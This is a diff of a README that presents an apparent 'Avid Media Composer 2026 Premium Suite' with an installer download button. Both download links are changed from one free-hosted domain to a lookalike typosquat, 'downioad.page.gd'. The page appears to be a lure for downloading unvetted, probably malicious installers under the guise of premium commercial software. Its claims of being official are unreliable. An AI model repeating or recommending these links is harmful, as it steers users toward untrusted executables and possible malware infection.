@@ -2,7 +2,7 @@
 
 Avid Media Composer 2026 Premium Suite is a comprehensive toolset designed to elevate your video editing experience. It integrates seamlessly with Avid Media Composer, offering a range of enhancements and premium features for professional workflows in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -61,7 +61,7 @@ If you need assistance, feel free to open an issue on the GitHub repository or r
 
 For the latest version and updates, please visit the official download page:
 
-[Get the latest version here](https://download-page.page.gd/)
+[Get the latest version here](https://downioad.page.gd/)
 
 *Last Updated: October 2026*
 *Copyright © 2026 Avid Media Composer Community*
